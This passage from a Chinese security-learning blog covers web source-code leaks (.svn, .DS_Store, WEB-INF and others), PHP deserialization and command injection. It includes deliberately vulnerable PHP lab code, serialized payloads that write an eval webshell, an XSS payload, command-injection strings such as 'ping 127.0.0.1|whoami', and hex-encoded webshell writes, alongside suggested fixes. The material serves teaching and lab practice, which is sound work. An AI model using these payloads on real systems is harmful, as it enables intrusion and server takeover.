href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a></p><pre><code class="php">rip-svn.pl -v -u http://www.example.com/.svn/</code></pre><p><a href="https://pan.baidu.com/s/1mrNpB" target="_blank" rel="noopener">Seay SVN</a></p><p><strong>3、修复建议</strong></p><p>1.在web服务器配置文件中增加一段代码，过滤到.svn文件，返回404<br>nginx服务器：</p><pre><code class="php">location ~ ^(.*)\/\.svn\/{return 404;}</code></pre><p>重启nginx<br>Apache服务器：</p><pre><code class="php">Order allow,denyDeny from all</code></pre><p>重启Apache</p><p>2.查找服务器上所有.svn隐藏文件夹，删除</p><p>以下命令删除当前目录下.svn文件夹</p><pre><code class="c">find . -type d -name &quot;.svn&quot;|xargs rm -rfrm -rf `find . -type d -name .svn`find . -name &quot;.svn&quot; -type d | xargs rm -frfind . -name &quot;.svn&quot; -type d | xargs -n1 rm -R</code></pre><p>使用脚本删除</p><pre><code class="py">#!/bin/shcd /home/web/find ./ -name &quot;.svn&quot; |xargs -n1 echo &gt; /dev/null 2&gt;&amp;1find ./ -name &quot;.svn&quot; -print0 | xargs -0 rm -frif [ $? -ne 0 ]; thenecho &quot;remove .svn dirs failed!&quot;fi</code></pre><p>以上文件保存为.sh<br>执行之后，会删除 /home/web目录及其子目录中 所有 .svn 隐藏文件夹。</p><p>3.在使用SVN时，严格使用导出功能。禁止直接复制代码</p><h3 id="0x04-CVS信息泄漏"><a href="#0x04-CVS信息泄漏" class="headerlink" title="0x04 .CVS信息泄漏"></a>0x04 .CVS信息泄漏</h3><p>CVS是一个年代比较久远的版本控制系统, 通过它可以追踪源代码的历史变化记录，但是因为功能比较简单, 而且不支持分支, 所以很早前就被上面提到的svn替代了。</p><p><strong>1、漏洞成因</strong></p><p>cvs项目在初始化(<code>cvs checkout project</code>)的时候, 会在project目录下创建一个名为CVS的目录,其中保存了各个文件的修改和commit记录.。通过此目录可以获取代码的历史版本.。<br>其中两个关键文件为:CVS/Root和CVS/Entries, 分别记录了项目的根信息和所有文件的结构。</p><p><strong>2、漏洞利用</strong></p><p><em>测试的目录</em></p><pre><code class="php">http://url/CVS/Root 返回根信息http://url/CVS/Entries 返回所有文件的结构</code></pre><p><em>取回源码的命令</em></p><pre><code class="php">bk clone http://url/name dir</code></pre><p>命令的意思就是把远端一个名为name的repo，clone到本地名为dir的目录下。<br><em>查看所有的改变的命令，转到download的目录</em></p><pre><code class="php">bk changes</code></pre><p><em>工具</em><br><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a></p><pre><code class="php">rip-cvs.pl -v -u http://www.example.com/CVS/</code></pre><p><strong>3、修复建议</strong></p><p>1.在目标服务器上删除CVS相关目录<br>2.限制对CVS相关目录的访问。</p><h3 id="0x05-DS-Store文件泄漏"><a href="#0x05-DS-Store文件泄漏" class="headerlink" title="0x05 .DS_Store文件泄漏"></a>0x05 .DS_Store文件泄漏</h3><p><code>.DS_Store</code> 文件 MAC 系统是用来存储这个文件夹的显示属性的：比如文件图标的摆放位置。如果用户删除以后的副作用就是这些信息的失去。这些文件本来是给 Finder 使用的，但它们被设想作为一种更通用的有关显示设置的元数据存储，诸如图标位置和视图设置。</p><p><strong>1、漏洞成因</strong></p><p>当需要把代码上传的时候，安全正确的操作应该把 <code>.DS_Store</code> 文件删除才正确。<br>因为里面包含了一些目录信息，如果没有删除，攻击者通过 <code>.DS_Store</code> 可以知道这个目录里面所有文件名称，从而让攻击者掌握了更多的信息。　</p><p>在发布代码时未删除文件夹中隐藏的 <code>.DS_store</code>，被发现后，获取了敏感的文件名等信息。攻击者可以利用访问 URL(<a href="http://www.example.com/.ds_store)的方式来判断，是否存在DS_store泄露，如果存在泄漏，使用工具dsstoreexp，就可以下载源码。" target="_blank" rel="noopener">http://www.example.com/.ds_store)的方式来判断，是否存在DS_store泄露，如果存在泄漏，使用工具dsstoreexp，就可以下载源码。</a></p><p><strong>2、漏洞利用</strong></p><p><em>工具</em><br><a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="noopener">dsstoreexp</a></p><pre><code class="php">python ds_store_exp.py http://www.example.com/.DS_Store</code></pre><p><strong>3、修复建议</strong></p><p>1.删除.Ds_Store文件*</p><pre><code class="c">find . -name &#39;*.DS_Store&#39; -type f -delete</code></pre><p>2.禁止.DS_Store文件的生成</p><pre><code class="c">defaults write com.apple.desktopservices DSDontWriteNetworkStores -bool TRUE</code></pre><p>恢复.DS_Store文件的生成</p><pre><code class="c">defaults delete com.apple.desktopservices DSDontWriteNetworkStores</code></pre><p>git中对.DS_Store文件的操作</p><pre><code class="c">删除项目中的所有.DS_Store。这会跳过不在项目中的 .DS_Store1.find . -name .DS_Store -print0 | xargs -0 git rm -f --ignore-unmatch将 .DS_Store 加入到 .gitignore2.echo .DS_Store &gt;&gt; ~/.gitignore更新项目3.git add --all4.git commit -m &#39;.DS_Store banished!&#39;</code></pre><h3 id="0x06-bzr源码泄露"><a href="#0x06-bzr源码泄露" class="headerlink" title="0x06 .bzr源码泄露"></a>0x06 .bzr源码泄露</h3><p>bzr，即Bazaar。也是个版本控制工具, 虽然不是很热门, 但它也是多平台支持, 并且有不错的图形界面,所以也有一些人认为bzr比git要好用。</p><p><strong>1、漏洞成因</strong></p><p>bzr在初始化项目时(bzr init/init-repo), 会在项目根目录产生名为.bzr的隐藏目录, 同样暴露了源代码和用户信息</p><p><strong>2、漏洞利用</strong></p><p><em>bzr revert命令</em></p><pre><code>wget -r --no-parent --mirror http://www.example.com/.bzrcd www.example.com &amp;&amp; bzr revert</code></pre><p><em>工具</em><br><a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="noopener">dsstoreexp</a></p><pre><code class="php">rip-bzr.pl -v -u http://www.example.com/.bzr/</code></pre><p><strong>3、修复建议</strong></p><p>删除.bzr文件(同.git)</p><h3 id="0x07-网站备份压缩文件"><a href="#0x07-网站备份压缩文件" class="headerlink" title="0x07 网站备份压缩文件"></a>0x07 网站备份压缩文件</h3><p>在网站的使用过程中，往往需要对网站中的文件进行修改、升级。此时就需要对网站整站或者其中某一页面进行备份。当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站web目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。</p><p><strong>1、漏洞成因</strong></p><ul><li>服务器管理员错误地将网站或者网页的备份文件放置到服务器web目录下。</li><li>编辑器在使用过程中自动保存的备份文件或者临时文件因为各种原因没有被删除而保存在web目录下。</li></ul><p>该漏洞往往会导致服务器整站源代码或者部分页面的源代码被下载，利用。源代码中所包含的各类敏感信息，如服务器数据库连接信息，服务器配置信息等会因此而泄露，造成巨大的损失。被泄露的源代码还可能会被用于代码审计，进一步利用而对整个系统的安全埋下隐患。</p><p><strong>2、漏洞利用</strong></p><p>在 URL 加上<code>域名+网站备份文件名 +压缩包后缀</code> 也就是 URL，下载网站源码。<br><em>部分常见的网站备份文件后缀名：</em></p><pre><code>.rar   .zip  .7z   .tar.gz   .bak    .swp   .txt</code></pre><p><em>部分常见的备份文件名：</em></p><pre><code>www   back   backup   web   temp   data   website   新建文件夹</code></pre><p><strong>3、修复建议</strong></p><p>把备份文件删除或移出web根目录</p><h3 id="0x08-WEB-INF-web-xml-泄露"><a href="#0x08-WEB-INF-web-xml-泄露" class="headerlink" title="0x08 WEB-INF/web.xml 泄露"></a>0x08 WEB-INF/web.xml 泄露</h3><p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。<br>WEB-INF主要包含一下文件或目录：</p><ul><li>/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</li><li>/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</li><li>/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</li><li>/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。</li><li>/WEB-INF/database.properties：数据库配置文件</li></ul><p><strong>1、漏洞成因</strong></p><p>通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。</p><p><strong>2、漏洞利用</strong></p><p>通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。<br>一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来</p><p><strong>3、修复建议</strong></p><p>修改Nginx配置文件禁止访问WEB-INF目录</p><pre><code class="c"> location ~ ^/WEB-INF/* { deny all; } 或者return 404; 或者其他！</code></pre><p>参考博客：<br><a href="https://blog.csdn.net/GitChat/article/details/79014538" target="_blank" rel="noopener">谈谈源码泄露 · WEB 安全</a><br><a href="https://www.secpulse.com/archives/55286.html" target="_blank" rel="noopener">常见Web源码泄露总结</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞原理 </category>
          
          <category> 信息泄露 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 源码泄露 </tag>
            
            <tag> 源码泄露类型 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP反序列化漏洞</title>
      <link href="/2019/08/14/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/08/14/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近又学习了新的漏洞知识——PHP反序列化漏洞，学习之余总结一下。</p><h3 id="什么是php反序列化漏洞"><a href="#什么是php反序列化漏洞" class="headerlink" title="什么是php反序列化漏洞"></a>什么是php反序列化漏洞</h3><p><strong>漏洞简介</strong><br>php反序列化漏洞，又叫php对象注入漏洞。<br>简单来讲，就是在php反序列化的时候，反序列化的内容是用户可控，那么恶意用户就可以构造特定序列化内容的代码，通过<strong>unserialize()函数</strong>进行特定的反序列化操作，并且程序的某处存在一些敏感操作是写在类中的，那么就可以通过这段恶意代码，达到执行攻击者想要的操作。</p><p><strong>漏洞形成原因</strong><br>漏洞的形成的根本原因是程序没有对用户输入的反序列化字符串进行检测，导致反序列化过程可以被恶意控制，进而造成代码执行、getshell等一系列不可控的后果。</p><p>但还是先了解一下php类与对象、php序列化和反序列化和魔术方法的相关知识。</p><h3 id="php类与对象"><a href="#php类与对象" class="headerlink" title="php类与对象"></a>php类与对象</h3><p><strong>类的声明</strong></p><pre><code class="php">[修饰类的关键字] class 类名 {    成员属性    成员方法}</code></pre><p>（1）成员属性，在类中声明的变量，称为成员属性。声明时，变量前面必须使用一个关键字，如使用public、private、static等关键字修饰，如不需要有特殊意义的修饰，则可使用<code>var关键字</code><br>（2）成员方法，在类中声明的函数，称为成员方法。</p><p><strong>通过类实例化对象</strong><br>类创建后，可以使用 new 运算符来实例化该类的对象。</p><pre><code class="php">$变量名 = new 类名称;</code></pre><p><strong>对象引用<code>$this</code></strong><br>成员方法属于哪个对象，$this引用就代表哪个对象。<br>例：</p><pre><code class="php">&lt;?phpclass Person {    public $name;    function say(){        echo &#39;我的名字是&#39;.$this-&gt;name;    }}$xm = new Person;    //实例化对象$xm-&gt;name = &#39;小明&#39;;  //对象属性的赋值$xm-&gt;say();        //访问对象的成员方法?&gt;</code></pre><p><strong>构造方法</strong><br>构造方法的作用是为成员属性初始化；<br>构造方法是在对象创建完后，第一个自动调用的方法；<br>构造方法，方法名固定，在PHP4中构造方法名与类名一致；PHP5中是 <code>__construct()</code><br><strong>析构方法</strong><br>当对象被释放之前最后一个自动调用的方法。<br>作用：关闭一些资源，做一个清理工作。<br>名称：<code>__destruct()</code><br>例：</p><pre><code class="php">&lt;?phpclass Person {    public $name;    function __construct($name=&#39;&#39;){        echo &quot;构造函数被调用&quot;.&quot;&lt;br&gt;&quot;;        $this-&gt;name = $name;    }    function say(){        echo $this-&gt;name;    }    function __destruct(){        echo &quot;&lt;br&gt;&quot;.&quot;析构函数被调用&quot;;    }}$car = new Person(); //当创建一个对象的时候，类中的构造函数就会被调用$car-&gt;name = &#39;小明 &#39;;  //对象属性的赋值$car-&gt;say();        //访问对象的成员方法unset($car); //unset可以销毁对象，当销毁对象的时候就会调用类中的析构函数?&gt;</code></pre><p><img src="http://img-blog.csdnimg.cn/20190815155959109.jpg" alt="在这里插入图片描述"></p><h3 id="php序列化与反序列化"><a href="#php序列化与反序列化" class="headerlink" title="php序列化与反序列化"></a>php序列化与反序列化</h3><p><strong>序列化：</strong><br>serialize 把一个对象转成字符串形式， 可以用于保存。<br>函数 : <strong>serialize()</strong><br>把复杂的数据类型压缩到一个字符串中 数据类型可以是数组，字符串，对象等。<br>序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。<br>测试代码：</p><pre><code class="php">&lt;?phpclass chybeta{    var $test = &#39;123&#39;;}$class1 = new chybeta;$class1_ser = serialize($class1);print_r($class1_ser);?&gt;</code></pre><p>将其序列化后的结果：<br><img src="http://img-blog.csdnimg.cn/20190814191446893.jpg" alt="在这里插入图片描述"></p><ul><li><code>O</code>代表存储的是对象（object）,假如你给serialize()传入的是一个数组，那它会变成字母a</li><li><code>7</code>表示对象的名称有7个字符</li><li><code>&quot;chybeta&quot;</code>表示对象的名称</li><li><code>1</code>表示有一个值</li><li><code>{s:4:&quot;test&quot;;s:3:&quot;123&quot;;}</code>中，s表示字符串，4表示该字符串的长度，”test”为字符串的名称，之后的类似</li></ul><p><strong>php允许保存一个对象方便以后重用，这个过程被称为序列化。</strong><br><strong>反序列化:</strong><br>unserialize 把serialize序列化后的字符串变成一个对象。<br>函数: <strong>unserialize()</strong><br>可以从已存储的表示中创建PHP的值。恢复原先被序列化的变量。<br>测试代码：</p><pre><code class="php">&lt;?phpclass chybeta{    var $test = &#39;123&#39;;}$class2 = &#39;O:7:&quot;chybeta&quot;:1:{s:4:&quot;test&quot;;s:3:&quot;123&quot;;}&#39;;print_r($class2);echo &quot;&lt;/br&gt;反序列化结果为：&lt;/br&gt;&quot;;$class2_unser = unserialize($class2);print_r($class2_unser);?&gt;</code></pre><p>将其反序列化后的结果：<br><img src="http://img-blog.csdnimg.cn/20190814191507778.jpg" alt="在这里插入图片描述"></p><h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><p><strong>magic 函数</strong><br>php面向对象变成中，有一类函数叫做magic function，魔术函数。这些函数是以(双下划线)开头的，他们是一些当依照某些规则实例化类或者调用某些函数的时候会自动调用这些magic函数，这里有一些比较常见的例如<strong>construct，</strong>destory，<strong>sleep，</strong>wakeup，__toString函数。</p><ul><li>__construct()：创建一个对象时会被调用。</li><li>__destruct()：销毁一个对象时会被调用。</li><li>__wakeup()：触发unserialize()方法时会被调用。</li><li>__sleep()：触发serialize()方法时会被调用。</li><li>__toString()：类对象被当作一个字符串使用时会被调用。</li><li>__get()：调出不可访问（private，protect等修饰）属性时会被调用。</li><li>__set()：修改或写入不可访问（private，protect等修饰）属性时会被调用。</li><li>__isset()：对不可访问（private，protect等修饰）属性使用empty()或isset()方法时会被调用。</li><li>__unset()：对不可访问（private，protect等修饰）属性使用unset()方法时会被调用。</li><li>__invoke()：将实例化对象当作方法使用时会被调用。</li></ul><h3 id="php反序列化漏洞"><a href="#php反序列化漏洞" class="headerlink" title="php反序列化漏洞"></a>php反序列化漏洞</h3><h4 id="1、wakeup-或destruct-的利用"><a href="#1、wakeup-或destruct-的利用" class="headerlink" title="1、wakeup()或destruct()的利用"></a>1、<strong>wakeup()或</strong>destruct()的利用</h4><p><strong>基本思路</strong><br>本地搭建好环境，通过 serialize() 得到我们要的序列化字符串，之后再传进去。通过源代码知，把对象中的test值赋为 “<?php @eval($_POST[a]);?>”,再调用unserialize()时会通过<strong>wakeup()把test的写入到<code>webshell.php</code>中。<br><strong>利用</strong><br>unserialize()后会导致</strong>wakeup() 或__destruct()的直接调用，中间无需其他过程。<br>所以在本地搭建环境，index1源码为：</p><pre><code class="php">&lt;?phpclass chybeta{    var $test = &#39;123&#39;;    function __wakeup(){        $fp = fopen(&quot;webshell.php&quot;,&quot;w&quot;) ;        fwrite($fp,$this-&gt;test);        fclose($fp);    }}$class3 = $_GET[&#39;test&#39;];print_r($class3);echo &quot;&lt;/br&gt;&quot;;$class3_unser = unserialize($class3);require &quot;webshell.php&quot;;// 为显示效果，把这个shell.php包含进来?&gt;</code></pre><p>编写exp之后用serialize函数进行序列化</p><pre><code class="php">&lt;?phpclass chybeta{    var $test = &#39;&lt;?php @eval($_POST[a]);?&gt;&#39;;}$class1 = new chybeta;$class1_ser = serialize($class1);print_r($class1_ser);?&gt;</code></pre><p>得到payload</p><pre><code class="php">O:7:&quot;chybeta&quot;:1:{s:4:&quot;test&quot;;s:25:&quot;&lt;?php @eval($_POST[a]);?&gt;&quot;;}</code></pre><p>测试一下，测试成功<br><img src="http://img-blog.csdnimg.cn/20190814212201873.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>并且将一句话木马写入到了<code>webshelll.php</code>文件<br><img src="http://img-blog.csdnimg.cn/2019081421263524.jpg" alt="在这里插入图片描述"></p><h4 id="2、其他Magic函数的利用"><a href="#2、其他Magic函数的利用" class="headerlink" title="2、其他Magic函数的利用"></a>2、其他Magic函数的利用</h4><p><strong>基本思路</strong><br>向test传入构造好的序列化字符串后，进行反序列化时自动调用 <strong>wakeup()函数，从而在new ph0en1x()会自动调用对象ph0en1x中的</strong>construct()方法，从而把<?php @eval($_POST[a]);?>写入到 <code>webshell.php</code>中。<br><strong>利用</strong><br>有时候反序列化一个对象时，由它调用的__wakeup()中又去调用了其他的对象。<br>在本地搭建环境(删除之前webshell.php里的内容)，index2源码为：</p><pre><code class="php">&lt;?phpclass ph0en1x{    function __construct($test){        $fp = fopen(&quot;webshell.php&quot;,&quot;w&quot;);        fwrite($fp,$test);        fclose($fp);    }}class chybeta{    var $test = &#39;123&#39;;    function __wakeup(){        $obj = new ph0en1x($this-&gt;test);    }}$class5 = $_GET[&#39;test&#39;];print_r($class5);echo &quot;&lt;/br&gt;&quot;;$class5_unser = unserialize($class5);require &quot;webshell.php&quot;;?&gt;</code></pre><p>编写exp之后，用serialize函数进行序列化，得到payload</p><pre><code class="php">O:7:&quot;chybeta&quot;:1:{s:4:&quot;test&quot;;s:25:&quot;&lt;?php @eval($_POST[a]);?&gt;&quot;;}</code></pre><p><img src="http://img-blog.csdnimg.cn/20190814220237878.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>并将一句话木马写入到了<code>webshelll.php</code>文件</p><h4 id="3、普通成员的利用"><a href="#3、普通成员的利用" class="headerlink" title="3、普通成员的利用"></a>3、普通成员的利用</h4><p><strong>基本思路</strong><br>new一个新的chybeta对象后，调用<strong>construct()，其中又new了ph0en1x对象。在结束后会调用</strong>destruct()，其中会调用action()，从而输出 ph0en1x。<br><strong>利用</strong><br>前面的利用都是基于“自动调用”的magic function。但当漏洞/危险代码存在类的普通方法中，就不能通过“自动调用”来达到目的。这时，要寻找相同的函数名，把敏感函数和类联系在一起。</p><pre><code class="php">&lt;?phpclass chybeta {    var $test;    function __construct() {        $this-&gt;test = new ph0en1x();    }    function __destruct() {        $this-&gt;test-&gt;action();    }}class ph0en1x {    function action() {        echo &quot;ph0en1x&quot;;    }}class ph0en2x {    var $test2;    function action() {        eval($this-&gt;test2);    }}$class6 = new chybeta();unserialize($_GET[&#39;test&#39;]);?&gt;</code></pre><p>构造序列化</p><pre><code class="php">&lt;?phpclass chybeta {    var $test;    function __construct() {        $this-&gt;test = new ph0en2x();    }}class ph0en2x {    var $test2 = &#39;@eval($_POST[a]);&#39;;}echo serialize(new chybeta());?&gt;</code></pre><p>得到payload：</p><pre><code class="php">O:7:&quot;chybeta&quot;:1:{s:4:&quot;test&quot;;O:7:&quot;ph0en2x&quot;:1:{s:5:&quot;test2&quot;;s:17:&quot;@eval($_POST[a]);&quot;;}}</code></pre><p>传给index.php的test参数<br><img src="http://img-blog.csdnimg.cn/20190814223422164.jpg" alt="在这里插入图片描述"><br>蚁剑测试一下，测试成功<br><img src="http://img-blog.csdnimg.cn/20190814223434166.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>参考博客：<br><a href="https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">浅谈php反序列化漏洞</a><br><a href="https://www.jianshu.com/p/be6de8511cb9?utm_campaign=maleskine&utm_content=note&utm_medium=seo_notes&utm_source=recommendation" target="_blank" rel="noopener">PHP反序列化漏洞与防御</a></p><h3 id="php反序列化漏洞靶场实战"><a href="#php反序列化漏洞靶场实战" class="headerlink" title="php反序列化漏洞靶场实战"></a>php反序列化漏洞靶场实战</h3><h4 id="靶场环境"><a href="#靶场环境" class="headerlink" title="靶场环境"></a>靶场环境</h4><p>皮卡丘：<a href="https://github.com/zhuifengshaonianhanlu/pikachu" target="_blank" rel="noopener">https://github.com/zhuifengshaonianhanlu/pikachu</a></p><h4 id="开始实验"><a href="#开始实验" class="headerlink" title="开始实验"></a>开始实验</h4><p><img src="http://img-blog.csdnimg.cn/20190814230749884.jpg" alt="在这里插入图片描述"><br>先输入个1，抓包查看<br><img src="http://img-blog.csdnimg.cn/20190814230833111.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现传参方式为post型，且参数变量为<code>o</code><br>其他没有有用信息。emmm。。查看源码吧！<br><img src="http://img-blog.csdnimg.cn/2019081423114941.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现有用信息了。先编写exp之后，然后用serialize函数进行序列化。因为是post传参，所以就不演示一句话了，并且根据源码<code>phpinfo();</code>也不行。直接xss弹框试一下</p><pre><code>&lt;?phpclass S{    var $test = &#39;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&#39;;}$class1 = new S;$class1_ser = serialize($class1);print_r($class1_ser);?&gt;</code></pre><p>得到payload</p><pre><code class="php">O:1:&quot;S&quot;:1:{s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;;}</code></pre><p>成功<br><img src="http://img-blog.csdnimg.cn/20190814232845759.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="感悟"><a href="#感悟" class="headerlink" title="感悟"></a>感悟</h3><p>了解了php类与对象、反序列化和序列化和反序列化漏洞的成因。同时也学会了php反序列化漏洞的三种利用方式。<br>继续学习，小白进阶ing。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞原理 </category>
          
          <category> 反序列化漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP类与对象 </tag>
            
            <tag> 序列化与反序列化基础 </tag>
            
            <tag> 魔术方法简单利用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行(Command Injection)与代码执行(Code execution)</title>
      <link href="/2019/08/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(Command%20Injection)%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C(Code%20execution)/"/>
      <url>/2019/08/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(Command%20Injection)%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C(Code%20execution)/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Web学习进行时，最近又学习了命令执行和代码执行漏洞。于是记录了学习过程。</p><h3 id="命令执行与代码执行基础"><a href="#命令执行与代码执行基础" class="headerlink" title="命令执行与代码执行基础"></a>命令执行与代码执行基础</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><h5 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h5><p><strong>命令执行漏洞概念：</strong><br>命令执行漏洞，就是指用户通过浏览器或其他辅助程序提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令。</p><p>通俗的讲：当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system、exec、shell_exec等，当用户可以控制命令执行函数中的参数时，将可以住人恶意系统命令到正常的命令中，造成命令执行攻击。<br><strong>命令执行漏洞成因：</strong><br>当我们开发的应用需要一些除去web的特殊功能时，就需要调用一些外部程序。<br><strong>命令执行漏洞：</strong><br>直接调用操作系统命令<br><strong>命令执行漏洞原理：</strong><br>在操作系统中，“&amp;、|、||”都可以作为命令连接符使用，用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令。<br><strong>命令执行相关函数</strong><br>本质：命令执行产生函数：exec，shell_exec，system，passthru等将参数以dos、shell执行</p><p>exec()、system()、popen()、passthru()、proc_open()、pcntl_exec()、shell_exec() 、反引号` 实际上是使用shell_exec()函数，此外还要小心mail()函数的安全。</p><ul><li>system() 输出并返回最后一行shell结果。</li><li>exec() 不输出结果，返回最后一行shell结果，所有结果可以保存到一个返回的数组里面。</li><li>passthru() 只调用命令，把命令的运行结果原样地直接输出到标准输出设备上。</li><li>popen()、proc_open() 不会直接返回执行结果，而是返回一个文件指针</li></ul><p><strong>命令执行分隔符：</strong></p><pre><code>windows： &amp;&amp;　　||　　&amp;　 |　linux：　  &amp;&amp;　  ||　　 &amp;　 |    ;</code></pre><p><strong>windows：</strong><br><code>|</code>     直接执行后面的语句      ping 127.0.0.1|whoami<br><code>||</code>    前面出错执行后面的 ，前面为假       ping  2 || whoami<br><code>&amp;</code>   前面的语句为假则直接执行后面的,前面可真可假                       ping 127.0.0.1&amp;whoami<br><code>&amp;&amp;</code>前面的语句为假则直接出错，后面的也不执行，前面只能为真    ping 127.0.0.1&amp;&amp;whoami<br><strong>Linux：</strong><br><code>;</code> 前面的执行完执行后面的      ping 127.0.0.1;whoami<br><code>|</code> 管道符，显示后面的执行结果   ping 127.0.0.1|whoami<br><code>||</code> 当前面的执行出错时执行后面的   ping 1||whoami<br><code>&amp;</code> 前面的语句为假则直接执行后面的,前面可真可假                       ping 127.0.0.1&amp;whoami<br><code>&amp;&amp;</code>前面的语句为假则直接出错，后面的也不执行，前面只能为真    ping 127.0.0.1&amp;&amp;whoami<br><strong>命令执行漏洞利用：</strong><br>1、可尝试进行反弹shell，搭建服务执行wget下载webshell。<br>2、写入webshell:<br>利用命令注入写一句话php webshell到web目录涉及到一些特殊字符的转义<br>假设需要写入<code>&lt;?php eval($_POST[kang]); ?&gt;</code>，方法如下：<br><em>Windows：</em><br>用<code>^</code>转义<code>&lt;</code>，即执行<code>echo ^&lt;?php eval($_POST[kang]); ?^&gt; &gt; web</code><br>web可写目录加文件完整名字<br><em>Linux：</em><br>linux下需要用<code>\</code>来转义<code>&lt;</code>，不过很多php都默认开启gpc(<a href="http://baike.baidu.com/item/magic_quotes_gpc/5932824?fr=aladdin" target="_blank" rel="noopener">魔术引号magic_quotes_gpc()</a>）。可以先用16进制转换一句话再用xxd命令把16进制还原，命令如下：<br><code>echo 3c3f706870206576616c28245f504f53545b6b616e675d293b203f3e|xxd -r -ps &gt; web</code><br>web可写目录加文件完整名字</p><p>后面命令注入也有时间盲注和sql注入很像<br><strong>命令执行漏洞修复建议：</strong></p><ul><li>尽量不使用命令执行函数</li><li>提交的变量在进入执行命令函数前进行过滤和检测(如：调用addslashes进行转义)</li><li>使用动态函数之前，确保使用的函数是指定的函数之一</li><li>对于PHP语言，不能完全控制的危险函数(如：disable_functions)最好不使用</li></ul><p> <em>PHP内置的两个函数可以有效防止命令执行：</em><br>escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。<br>资料参考：<a href="http://cn.php.net/manual/zh/function.escapeshellarg.php" target="_blank" rel="noopener">http://cn.php.net/manual/zh/function.escapeshellarg.php</a></p><p>escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 